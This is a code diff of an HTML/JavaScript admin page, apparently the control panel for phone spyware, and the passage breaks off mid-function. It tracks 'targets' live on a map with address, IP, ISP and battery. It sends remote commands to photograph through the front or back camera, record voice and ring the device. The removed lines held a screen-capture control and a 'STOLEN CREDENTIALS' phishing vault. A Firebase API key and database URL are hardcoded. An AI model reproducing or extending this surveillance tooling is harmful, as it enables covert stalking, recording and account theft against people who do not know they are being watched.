@@ -3,284 +3,874 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pro Command Center</title>
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <title>Command Center — Admin</title>
+    <meta name="description" content="Secure Admin Command Center Panel">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
     <style>
-        body { margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow: hidden; background: #000;}
-        #map { height: 100vh; width: 100%; z-index: 1; }
-        
-        /* Security Overlay */
-        .security-screen { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #0b0f19; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        .passcode-box { background: rgba(15, 23, 42, 0.9); padding: 30px; border-radius: 15px; border: 1px solid #38bdf8; box-shadow: 0 0 30px rgba(56,189,248,0.2); text-align: center; }
-        .passcode-box h2 { color: #f8fafc; margin-top: 0; }
-        .pass-input { background: #1e293b; border: 1px solid #475569; color: white; padding: 10px; font-size: 18px; border-radius: 8px; width: 150px; text-align: center; letter-spacing: 5px; outline: none; }
-        .pass-btn { background: #38bdf8; border: none; padding: 10px 20px; color: black; font-weight: bold; border-radius: 8px; cursor: pointer; margin-top: 15px; }
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
-        .dashboard { position: absolute; top: 15px; left: 15px; background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(10px); padding: 20px; border-radius: 15px; z-index: 1000; box-shadow: 0 10px 30px rgba(0,0,0,0.8); width: 340px; max-height: 90vh; overflow-y: auto; border: 1px solid rgba(56,189,248,0.2); color: white; transition: 0.3s;}
-        .dashboard::-webkit-scrollbar { width: 5px; } .dashboard::-webkit-scrollbar-thumb { background: #38bdf8; border-radius: 5px; }
-        
-        .dash-header { font-size: 18px; font-weight: bold; border-bottom: 1px solid #334155; padding-bottom: 10px; margin-bottom: 10px; color: #38bdf8; display: flex; justify-content: space-between; align-items: center;}
-        
-        /* User Selector */
-        .target-box { background: rgba(239, 68, 68, 0.1); border: 1px solid #ef4444; border-radius: 8px; padding: 10px; margin-bottom: 15px; text-align: center;}
-        .target-select { width: 100%; background: #0f172a; color: #f8fafc; border: 1px solid #38bdf8; padding: 8px; border-radius: 5px; font-size: 14px; outline: none; margin-top: 5px;}
+        :root {
+            --bg: #060812;
+            --panel: rgba(10, 15, 30, 0.92);
+            --surface: rgba(255,255,255,0.04);
+            --border: rgba(255,255,255,0.08);
+            --border-accent: rgba(56,189,248,0.25);
+            --accent: #38bdf8;
+            --accent2: #818cf8;
+            --green: #10b981;
+            --red: #f43f5e;
+            --orange: #f59e0b;
+            --purple: #8b5cf6;
+            --pink: #ec4899;
+            --text: #f1f5f9;
+            --muted: #64748b;
+            --panel-width: 360px;
+        }
 
-        .data-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px; background: rgba(0,0,0,0.3); padding: 8px; border-radius: 8px;}
-        .data-label { color: #94a3b8; } .data-val { font-weight: bold; color: #f8fafc; text-align: right; max-width: 60%; word-wrap: break-word;}
-        
-        .address-box { background: rgba(16, 185, 129, 0.1); border-left: 4px solid #10b981; padding: 10px; border-radius: 5px; font-size: 13px; color: #e2e8f0; margin-bottom: 10px; line-height: 1.4;}
-        
-        .btn-group { display: flex; gap: 5px; margin-top: 10px; flex-wrap: wrap;}
-        .action-btn { flex: 1; min-width: 45%; padding: 8px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; color: white; transition: 0.2s; font-size: 12px;}
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
+        }
+
+        /* ── Map ── */
+        #map {
+            position: absolute;
+            inset: 0;
+            z-index: 1;
+        }
+        .leaflet-tile-pane { filter: brightness(0.85) saturate(1.1); }
+        .leaflet-control-layers { background: rgba(10,15,30,0.9) !important; border: 1px solid var(--border-accent) !important; color: var(--text) !important; border-radius: 10px !important; }
+        .leaflet-control-layers label { color: var(--text) !important; }
+
+        /* ── Panel Toggle Btn ── */
+        #showPanelBtn {
+            display: none;
+            position: absolute;
+            top: 16px;
+            left: 16px;
+            z-index: 1000;
+            background: rgba(10,15,30,0.9);
+            color: var(--accent);
+            border: 1px solid var(--border-accent);
+            padding: 10px 16px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 13px;
+            backdrop-filter: blur(12px);
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+            transition: 0.2s;
+        }
+        #showPanelBtn:hover { background: rgba(56,189,248,0.1); }
+
+        /* ── Side Panel ── */
+        .panel {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: var(--panel-width);
+            height: 100%;
+            z-index: 900;
+            background: var(--panel);
+            border-right: 1px solid var(--border-accent);
+            backdrop-filter: blur(20px);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            box-shadow: 4px 0 40px rgba(0,0,0,0.6);
+            transition: transform 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .panel.hidden { transform: translateX(-100%); }
+
+        /* ── Panel Header ── */
+        .panel-header {
+            padding: 18px 20px 16px;
+            border-bottom: 1px solid var(--border);
+            flex-shrink: 0;
+            background: rgba(56,189,248,0.04);
+        }
+        .panel-brand {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 13px;
+            font-weight: 700;
+            letter-spacing: 2px;
+            background: linear-gradient(135deg, var(--accent), var(--accent2));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 8px;
+        }
+        .panel-status-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 7px;
+            font-size: 12px;
+        }
+        .status-dot {
+            width: 8px; height: 8px;
+            border-radius: 50%;
+            background: var(--muted);
+            transition: background 0.3s, box-shadow 0.3s;
+        }
+        .status-dot.live {
+            background: var(--green);
+            box-shadow: 0 0 10px var(--green);
+            animation: blink 1.5s ease-in-out infinite;
+        }
+        .status-dot.offline { background: var(--red); box-shadow: 0 0 8px var(--red); }
+        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.4} }
+
+        .status-text { font-weight: 600; font-size: 12px; }
+        .status-text.live { color: var(--green); }
+        .status-text.offline { color: var(--red); }
+        .status-time { font-size: 11px; color: var(--muted); }
+
+        .hide-btn {
+            background: transparent;
+            border: 1px solid rgba(244,63,94,0.3);
+            color: var(--red);
+            padding: 4px 10px;
+            border-radius: 7px;
+            cursor: pointer;
+            font-size: 11px;
+            font-weight: 600;
+            transition: 0.2s;
+        }
+        .hide-btn:hover { background: rgba(244,63,94,0.1); }
+
+        /* ── Panel Scroll Area ── */
+        .panel-body {
+            flex: 1;
+            overflow-y: auto;
+            padding: 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .panel-body::-webkit-scrollbar { width: 4px; }
+        .panel-body::-webkit-scrollbar-thumb { background: var(--border-accent); border-radius: 99px; }
+
+        /* ── Section ── */
+        .section {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 14px;
+        }
+        .section-title {
+            font-size: 10px;
+            font-weight: 700;
+            color: var(--muted);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .section-title::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: var(--border);
+        }
+
+        /* ── Address Box ── */
+        .address-box {
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            background: rgba(16,185,129,0.08);
+            border: 1px solid rgba(16,185,129,0.2);
+            border-radius: 10px;
+            padding: 10px 12px;
+            font-size: 12px;
+            line-height: 1.6;
+            color: #cbd5e1;
+        }
+        .address-box .addr-icon { font-size: 16px; flex-shrink: 0; margin-top: 1px; }
+
+        /* ── Info Grid ── */
+        .info-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 7px 10px;
+            background: rgba(0,0,0,0.25);
+            border-radius: 8px;
+            font-size: 12px;
+        }
+        .info-label { color: var(--muted); font-weight: 500; }
+        .info-value { font-weight: 600; color: var(--text); text-align: right; max-width: 60%; word-break: break-all; }
+        .info-value.highlight { color: var(--accent); }
+
+        /* ── Speed Indicator ── */
+        .speed-bar-wrap { margin-top: 4px; }
+        .speed-bar-track {
+            height: 4px;
+            background: var(--border);
+            border-radius: 99px;
+            overflow: hidden;
+            margin-top: 4px;
+        }
+        .speed-bar-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, var(--green), var(--accent));
+            border-radius: 99px;
+            transition: width 1s ease;
+        }
+
+        /* ── Action Buttons ── */
+        .btn-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+        }
+        .btn-grid .full { grid-column: 1 / -1; }
+
+        .action-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            padding: 10px 12px;
+            border: none;
+            border-radius: 10px;
+            font-size: 12px;
+            font-weight: 700;
+            cursor: pointer;
+            color: white;
+            transition: transform 0.15s, opacity 0.2s, box-shadow 0.2s;
+            letter-spacing: 0.3px;
+            position: relative;
+            overflow: hidden;
+        }
+        .action-btn::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: rgba(255,255,255,0.1);
+            opacity: 0;
+            transition: opacity 0.2s;
+        }
+        .action-btn:hover::after { opacity: 1; }
         .action-btn:active { transform: scale(0.95); }
-        .ring-btn { background: #ef4444; } .msg-btn { background: #3b82f6; } 
-        .photo-btn { background: #8b5cf6; } .audio-btn { background: #ec4899; } .geo-btn { background: #f59e0b; color: black; min-width: 45%;} .screen-btn { background: #14b8a6; color: white; min-width: 45%;}
-        
-        .media-box { margin-top: 10px; border: 1px dashed #38bdf8; border-radius: 8px; padding: 8px; text-align: center; display: none; background: rgba(0,0,0,0.5);}
-        .media-box img { max-width: 100%; border-radius: 5px; margin-top: 5px; }
-        .media-box audio { width: 100%; margin-top: 5px; outline: none; }
-        
-        /* Phishing Vault */
-        .vault-box { margin-top: 10px; background: rgba(220, 38, 38, 0.2); border: 1px solid #ef4444; border-radius: 8px; padding: 10px; display: none;}
-        .vault-title { color: #f82a2a; font-size: 14px; font-weight: bold; margin-bottom: 5px; text-align: center;}
-        
-        .smart-marker { text-align: center; font-size: 35px; filter: drop-shadow(2px 4px 6px rgba(0,0,0,0.5)); transition: transform 0.3s; }
-        .hide-btn { background: transparent; border: 1px solid #ef4444; color: #ef4444; padding: 3px 8px; border-radius: 5px; cursor: pointer; font-size: 12px;}
-        .show-panel-btn { position: absolute; top: 15px; left: 15px; background: #0f172a; color: #38bdf8; border: 1px solid #38bdf8; padding: 10px 15px; border-radius: 8px; z-index: 1001; cursor: pointer; font-weight: bold; display: none; box-shadow: 0 5px 15px rgba(0,0,0,0.5);}
-        
-        .geo-alert { position: absolute; top: 20px; left: 50%; transform: translateX(-50%); background: #ef4444; color: white; padding: 15px 30px; font-weight: bold; font-size: 16px; border-radius: 10px; z-index: 2000; box-shadow: 0 0 20px rgba(239, 68, 68, 0.8); display: none; animation: blinker 1s linear infinite;}
-        @keyframes blinker { 50% { opacity: 0.5; } }
+
+        .btn-ring { background: linear-gradient(135deg, #ef4444, #dc2626); box-shadow: 0 4px 15px rgba(239,68,68,0.3); }
+        .btn-front { background: linear-gradient(135deg, #8b5cf6, #7c3aed); box-shadow: 0 4px 15px rgba(139,92,246,0.3); }
+        .btn-back { background: linear-gradient(135deg, #6366f1, #4f46e5); box-shadow: 0 4px 15px rgba(99,102,241,0.3); }
+        .btn-audio { background: linear-gradient(135deg, #ec4899, #db2777); box-shadow: 0 4px 15px rgba(236,72,153,0.3); }
+        .btn-geo { background: linear-gradient(135deg, #f59e0b, #d97706); box-shadow: 0 4px 15px rgba(245,158,11,0.3); }
+        .btn-geo.active { background: linear-gradient(135deg, #10b981, #059669); box-shadow: 0 4px 15px rgba(16,185,129,0.3); }
+
+        /* ── Media Boxes ── */
+        .media-section {
+            display: none;
+            background: var(--surface);
+            border: 1px dashed var(--border-accent);
+            border-radius: 14px;
+            padding: 14px;
+        }
+        .media-section.visible { display: block; }
+
+        .media-label {
+            font-size: 11px;
+            font-weight: 600;
+            color: var(--muted);
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .media-badge {
+            padding: 2px 8px;
+            border-radius: 99px;
+            font-size: 10px;
+            font-weight: 700;
+        }
+        .badge-waiting { background: rgba(245,158,11,0.2); color: var(--orange); }
+        .badge-ok { background: rgba(16,185,129,0.2); color: var(--green); }
+        .badge-err { background: rgba(244,63,94,0.2); color: var(--red); }
+
+        .spy-img { width: 100%; border-radius: 8px; margin-top: 6px; display: none; border: 1px solid var(--border); }
+        .spy-img.visible { display: block; }
+
+        .spy-audio { width: 100%; margin-top: 8px; border-radius: 8px; display: none; }
+        .spy-audio.visible { display: block; }
+        audio::-webkit-media-controls-panel { background: rgba(30,41,59,0.9); }
+
+        .media-actions {
+            display: flex;
+            gap: 6px;
+            margin-top: 10px;
+        }
+        .media-actions a, .media-actions button {
+            flex: 1;
+            padding: 7px;
+            font-size: 11px;
+            font-weight: 700;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none;
+            transition: opacity 0.2s;
+        }
+        .media-actions a:hover, .media-actions button:hover { opacity: 0.8; }
+        .btn-dl { background: rgba(16,185,129,0.2); color: var(--green); border: 1px solid rgba(16,185,129,0.3) !important; }
+        .btn-del { background: rgba(244,63,94,0.2); color: var(--red); border: 1px solid rgba(244,63,94,0.3) !important; }
+
+        /* ── Route Info ── */
+        .route-stat {
+            display: flex;
+            gap: 8px;
+        }
+        .route-card {
+            flex: 1;
+            background: rgba(0,0,0,0.3);
+            border-radius: 10px;
+            padding: 10px;
+            text-align: center;
+        }
+        .route-card .r-val {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--accent);
+        }
+        .route-card .r-lbl { font-size: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin-top: 2px; }
+
+        /* ── Map Marker ── */
+        .smart-marker { text-align: center; font-size: 32px; filter: drop-shadow(0 2px 8px rgba(0,0,0,0.6)); transition: transform 0.4s; }
+
+        /* ── Notification Toast ── */
+        #toast {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            z-index: 9999;
+            background: rgba(10,15,30,0.95);
+            border: 1px solid var(--border-accent);
+            color: var(--text);
+            padding: 12px 18px;
+            border-radius: 12px;
+            font-size: 13px;
+            font-weight: 500;
+            backdrop-filter: blur(16px);
+            box-shadow: 0 8px 32px rgba(0,0,0,0.6);
+            display: none;
+            animation: slideUp 0.3s ease;
+            max-width: 280px;
+        }
+        #toast.success { border-color: rgba(16,185,129,0.4); }
+        #toast.error { border-color: rgba(244,63,94,0.4); }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* ── Geofence Alert ── */
+        #geoAlert {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 9999;
+            background: rgba(10,15,30,0.98);
+            border: 2px solid var(--red);
+            border-radius: 20px;
+            padding: 32px;
+            text-align: center;
+            backdrop-filter: blur(20px);
+            box-shadow: 0 0 60px rgba(244,63,94,0.4);
+            animation: alertPulse 0.5s ease;
+            max-width: 320px;
+            width: 90%;
+        }
+        @keyframes alertPulse { from { transform: translate(-50%,-50%) scale(0.8); opacity: 0; } to { transform: translate(-50%,-50%) scale(1); opacity: 1; } }
+        #geoAlert h3 { color: var(--red); font-size: 20px; margin-bottom: 8px; }
+        #geoAlert p { color: var(--muted); font-size: 13px; line-height: 1.6; }
+        #closeGeoAlert { margin-top: 20px; background: var(--red); color: white; border: none; padding: 10px 24px; border-radius: 10px; cursor: pointer; font-weight: 700; font-size: 13px; }
+
+        /* ── Responsive ── */
+        @media (max-width: 400px) {
+            :root { --panel-width: 100vw; }
+            .panel { border-right: none; }
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-thumb { background: rgba(56,189,248,0.2); border-radius: 99px; }
     </style>
 </head>
 <body>
 
-    <!-- Security Overlay -->
-    <div id="securityScreen" class="security-screen">
-        <div class="passcode-box">
-            <h2>🛡️ Admin Access</h2>
-            <p style="color: #94a3b8; font-size: 14px;">Enter Security Passcode</p>
-            <input type="password" id="passInput" class="pass-input" placeholder="****" maxlength="4">
-            <br><button id="passBtn" class="pass-btn">LOGIN</button>
-            <p id="passError" style="color: #ef4444; font-size: 12px; display: none; margin-top: 10px;">Incorrect passcode!</p>
-        </div>
-    </div>
-
-    <div id="geoAlert" class="geo-alert">⚠️ GEOFENCE BREACH DETECTED! ⚠️</div>
-
-    <button id="showPanelBtn" class="show-panel-btn">➕ Show Dashboard</button>
-
-    <div class="dashboard" id="mainDashboard">
-        <div class="dash-header">
-            <span>🛰️ Multi-Tracker Pro</span>
-            <button id="hidePanelBtn" class="hide-btn">➖ Hide</button>
-        </div>
-
-        <div class="target-box">
-            <span style="font-size: 12px; font-weight: bold;">SELECT TARGET</span>
-            <select id="userSelect" class="target-select">
-                <option value="">Listening for targets...</option>
-            </select>
-        </div>
-        
-        <div class="address-box" id="addressUI">📍 Waiting for data...</div>
-        
-        <div class="data-row"><span class="data-label">Status:</span> <span class="data-val" id="statusBadge" style="color:#64748b;">Offline</span></div>
-        <div class="data-row"><span class="data-label">Device Info:</span> <span class="data-val" id="deviceUI">--</span></div>
-        <div class="data-row"><span class="data-label">Battery Power:</span> <span class="data-val" id="batUI">--</span></div>
-        <div class="data-row"><span class="data-label">Network/ISP:</span> <span class="data-val" id="ispUI">--</span></div>
-        <div class="data-row"><span class="data-label">Speed:</span> <span class="data-val" id="speedUI">0 km/h</span></div>
-        <div class="data-row"><span class="data-label">Motion Tilt (XYZ):</span> <span class="data-val" id="motionUI">--</span></div>
-        
-        <div class="btn-group">
-            <button id="photoFrontBtn" class="action-btn photo-btn">📸 Front Cam</button>
-            <button id="photoBackBtn" class="action-btn photo-btn">📸 Back Cam</button>
-            <button id="audioBtn" class="action-btn audio-btn">🎙️ 5s Voice</button>
-            <button id="screenBtn" class="action-btn screen-btn">📲 Screen Cap</button>
-            <button id="ringBtn" class="action-btn ring-btn">🔔 Ring</button>
-            <button id="geoBtn" class="action-btn geo-btn">🛡️ Geofence: OFF</button>
-        </div>
-
-        <!-- Media Output -->
-        <div class="media-box" id="photoBox">
-            <div id="photoStatus" style="font-size: 12px; color: #94a3b8;">Latest Snapshot</div>
-            <img id="spyImg" src="" alt="">
-            <div style="margin-top: 5px;"><a id="downloadPhoto" download="spy-photo.jpg" style="color: #10b981; font-size:12px; text-decoration:none;">💾 Download</a></div>
-        </div>
-
-        <div class="media-box" id="audioBox">
-            <div id="audioStatus" style="font-size: 12px; color: #94a3b8;">Latest Voice Record</div>
-            <audio id="spyAudio" controls></audio>
-        </div>
-
-        <!-- Phishing Vault -->
-        <div class="vault-box" id="vaultBox">
-            <div class="vault-title">💀 STOLEN CREDENTIALS</div>
-            <div class="data-row"><span class="data-label">Platform:</span> <span class="data-val" id="vaultPlat"></span></div>
-            <div class="data-row"><span class="data-label">Username:</span> <span class="data-val" id="vaultUser"></span></div>
-            <div class="data-row" style="margin-bottom:0;"><span class="data-label">Password:</span> <span class="data-val" id="vaultPass" style="color:#ef4444;"></span></div>
-        </div>
-    </div>
-
     <div id="map"></div>
+
+    <!-- Show Panel Button (visible when panel is hidden) -->
+    <button id="showPanelBtn" onclick="togglePanel(true)">🛰 Show Panel</button>
+
+    <!-- Toast Notification -->
+    <div id="toast"></div>
+
+    <!-- Geofence Alert -->
+    <div id="geoAlert">
+        <h3>⚠️ Geofence Alert!</h3>
+        <p id="geoAlertMsg">Target has moved outside the geofence boundary!</p>
+        <button id="closeGeoAlert" onclick="document.getElementById('geoAlert').style.display='none'">Dismiss</button>
+    </div>
+
+    <!-- Side Panel -->
+    <div class="panel" id="mainPanel">
+
+        <!-- Header -->
+        <div class="panel-header">
+            <div class="panel-brand">⬡ COMMAND CENTER</div>
+            <div class="panel-status-row">
+                <div class="status-indicator">
+                    <div class="status-dot" id="statusDot"></div>
+                    <span class="status-text" id="statusText">Waiting...</span>
+                </div>
+                <div class="status-time" id="lastSeenTime"></div>
+                <button class="hide-btn" onclick="togglePanel(false)">✕ Hide</button>
+            </div>
+        </div>
+
+        <!-- Body -->
+        <div class="panel-body">
+
+            <!-- Address -->
+            <div class="address-box">
+                <span class="addr-icon">📍</span>
+                <span id="addressUI">Waiting for GPS data...</span>
+            </div>
+
+            <!-- Device Info -->
+            <div class="section">
+                <div class="section-title">📱 Device Info</div>
+                <div class="info-grid">
+                    <div class="info-row">
+                        <span class="info-label">Device</span>
+                        <span class="info-value" id="deviceUI">--</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Battery</span>
+                        <span class="info-value highlight" id="batUI">--</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">IP Address</span>
+                        <span class="info-value" id="ipUI">--</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Network/ISP</span>
+                        <span class="info-value" id="ispUI">--</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Accuracy</span>
+                        <span class="info-value" id="accUI">--</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Speed / Movement -->
+            <div class="section">
+                <div class="section-title">🚀 Movement</div>
+                <div class="route-stat">
+                    <div class="route-card">
+                        <div class="r-val" id="speedUI">0</div>
+                        <div class="r-lbl">km/h</div>
+                    </div>
+                    <div class="route-card">
+                        <div class="r-val" id="headingUI">0°</div>
+                        <div class="r-lbl">Heading</div>
+                    </div>
+                    <div class="route-card">
+                        <div class="r-val" id="pointsUI">0</div>
+                        <div class="r-lbl">Points</div>
+                    </div>
+                </div>
+                <div class="speed-bar-wrap">
+                    <div style="font-size:11px; color:var(--muted); margin-top:10px;">Speed Meter</div>
+                    <div class="speed-bar-track"><div class="speed-bar-fill" id="speedBarFill"></div></div>
+                </div>
+            </div>
+
+            <!-- Commands -->
+            <div class="section">
+                <div class="section-title">🎮 Remote Commands</div>
+                <div class="btn-grid">
+                    <button class="action-btn btn-ring" id="ringBtn">🔔 Ring</button>
+                    <button class="action-btn btn-audio" id="audioBtn">🎙️ Voice 5s</button>
+                    <button class="action-btn btn-front" id="photoFrontBtn">📸 Front Cam</button>
+                    <button class="action-btn btn-back" id="photoBackBtn">📸 Back Cam</button>
+                    <button class="action-btn btn-geo full" id="geoBtn">🛡️ Geofence: OFF</button>
+                </div>
+            </div>
+
+            <!-- Photo -->
+            <div class="media-section" id="photoBox">
+                <div class="media-label">
+                    📷 Photo Capture
+                    <span class="media-badge badge-waiting" id="photoBadge">Waiting</span>
+                </div>
+                <img class="spy-img" id="spyImg" src="" alt="Captured photo">
+                <div class="media-actions" id="photoActions" style="display:none;">
+                    <a class="btn-dl" id="downloadPhoto" download="capture.jpg">💾 Download</a>
+                    <button class="btn-del" id="deletePhoto">🗑️ Delete</button>
+                </div>
+            </div>
+
+            <!-- Audio -->
+            <div class="media-section" id="audioBox">
+                <div class="media-label">
+                    🎙️ Voice Recording
+                    <span class="media-badge badge-waiting" id="audioBadge">Waiting</span>
+                </div>
+                <audio class="spy-audio" id="spyAudio" controls></audio>
+                <div class="media-actions" id="audioActions" style="display:none;">
+                    <a class="btn-dl" id="downloadAudio" download="voice.webm">💾 Download</a>
+                    <button class="btn-del" id="deleteAudio">🗑️ Delete</button>
+                </div>
+            </div>
+
+            <!-- Coords (raw) -->
+            <div class="section">
+                <div class="section-title">🌐 Coordinates</div>
+                <div class="info-grid">
+                    <div class="info-row">
+                        <span class="info-label">Latitude</span>
+                        <span class="info-value highlight" id="latUI">--</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Longitude</span>
+                        <span class="info-value highlight" id="lngUI">--</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Open in Maps</span>
+                        <a id="mapsLink" href="#" target="_blank" style="font-size:12px; color:var(--accent); text-decoration:none; font-weight:600;">Google Maps ↗</a>
+                    </div>
+                </div>
+            </div>
+
+        </div><!-- end panel-body -->
+    </div><!-- end panel -->
 
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
         import { getDatabase, ref, onValue, set, remove } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
 
-        const firebaseConfig = { apiKey: "AIzaSyAoQw5dhwS5JJZIWSPQTgKdMtB5ZEsoxLk", authDomain: "arng-805db.firebaseapp.com", projectId: "arng-805db", databaseURL: "https://arng-805db-default-rtdb.firebaseio.com/" };
-        
-        // Error Tracker to show issues on screen
-        window.addEventListener('unhandledrejection', function(event) {
-            alert("⚠️ Admin Panel Error: " + (event.reason ? event.reason.message : "Database permission denied. Please check Firebase Rules."));
+        // ─── Firebase Init ──────────────────────────────────────────────
+        const firebaseConfig = {
+            apiKey: "AIzaSyAoQw5dhwS5JJZIWSPQTgKdMtB5ZEsoxLk",
+            authDomain: "arng-805db.firebaseapp.com",
+            projectId: "arng-805db",
+            databaseURL: "https://arng-805db-default-rtdb.firebaseio.com/"
+        };
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // ─── Map Setup ──────────────────────────────────────────────────
+        const satLayer = L.tileLayer('https://{s}.google.com/vt/lyrs=s,h&x={x}&y={y}&z={z}', {
+            maxZoom: 20, subdomains: ['mt0','mt1','mt2','mt3'], attribution: '© Google'
         });
-        
-        const app = initializeApp(firebaseConfig); const db = getDatabase(app);
-
-        // Security Login
-        document.getElementById('passBtn').addEventListener('click', () => {
-            if(document.getElementById('passInput').value === '1234') { 
-                document.getElementById('securityScreen').style.display = 'none';
-            } else { document.getElementById('passError').style.display = 'block'; }
+        const streetLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            maxZoom: 19, attribution: '© OpenStreetMap'
+        });
+        const terrainLayer = L.tileLayer('https://{s}.google.com/vt/lyrs=p&x={x}&y={y}&z={z}', {
+            maxZoom: 20, subdomains: ['mt0','mt1','mt2','mt3'], attribution: '© Google'
         });
 
-        // Map Init
-        const satLayer = L.tileLayer('https://{s}.google.com/vt/lyrs=s,h&x={x}&y={y}&z={z}', { maxZoom: 20, subdomains: ['mt0', 'mt1', 'mt2', 'mt3']});
-        const map = L.map('map', { layers: [satLayer] }).setView([23.8103, 90.4125], 6);
-        
-        let marker = null; let accuracyRadar = null; 
-        let routeLine = L.polyline([], {color: '#ef4444', weight: 4, opacity: 0.8}).addTo(map);
-        let lastLat = 0, lastLng = 0; let geofenceEnabled = false; let geofenceCenter = null;
-        
-        let activeUserId = null;
-        let activeListeners = [];
+        const map = L.map('map', { layers: [satLayer], zoomControl: false }).setView([23.8103, 90.4125], 6);
+        L.control.zoom({ position: 'bottomright' }).addTo(map);
+        L.control.layers({
+            "🛰 Satellite": satLayer,
+            "🗺 Street": streetLayer,
+            "🌿 Terrain": terrainLayer
+        }, {}, { position: 'topright' }).addTo(map);
 
-        // UI Panel Toggles
-        document.getElementById('hidePanelBtn').addEventListener('click', () => { document.getElementById('mainDashboard').style.display='none'; document.getElementById('showPanelBtn').style.display='block'; });
-        document.getElementById('showPanelBtn').addEventListener('click', () => { document.getElementById('mainDashboard').style.display='block'; document.getElementById('showPanelBtn').style.display='none'; });
+        // ─── State Variables ────────────────────────────────────────────
+        let marker = null;
+        let accuracyCircle = null;
+        let routePoints = 0;
+        let routeLine = L.polyline([], { color: '#f43f5e', weight: 3, opacity: 0.9, dashArray: '6,4' }).addTo(map);
+        let lastLat = 0, lastLng = 0;
+        let geofenceEnabled = false, geofenceCircle = null, geofenceCenter = null;
+        let panelVisible = true;
 
-        // Fetch All Users
-        onValue(ref(db, 'live_location/users'), (snapshot) => {
-            const users = snapshot.val();
-            const select = document.getElementById('userSelect');
-            const currentSelected = select.value;
-            
-            select.innerHTML = '<option value="">Select a Target</option>';
-            if(users) {
-                Object.keys(users).forEach(uid => {
-                    const info = users[uid].info;
-                    const status = info && info.isOnline ? "🟢" : "🔴";
-                    const ispp = info && info.isp ? info.isp.substring(0,10) : "";
-                    select.innerHTML += `<option value="${uid}">${status} Target: ${uid} (${ispp})</option>`;
-                });
-                if(users[currentSelected]) select.value = currentSelected;
+        // ─── Panel Toggle ───────────────────────────────────────────────
+        window.togglePanel = function(show) {
+            panelVisible = show;
+            const panel = document.getElementById('mainPanel');
+            const showBtn = document.getElementById('showPanelBtn');
+            if (show) {
+                panel.classList.remove('hidden');
+                showBtn.style.display = 'none';
+            } else {
+                panel.classList.add('hidden');
+                showBtn.style.display = 'block';
             }
-        });
+        };
 
-        // Command Buttons (Contextual to active user)
-        const sendCmd = (data) => {
-            if(!activeUserId) return alert("Select a target first!");
-            set(ref(db, `live_location/users/${activeUserId}/command`), data);
+        // ─── Toast ─────────────────────────────────────────────────────
+        function showToast(msg, type = 'info', duration = 3000) {
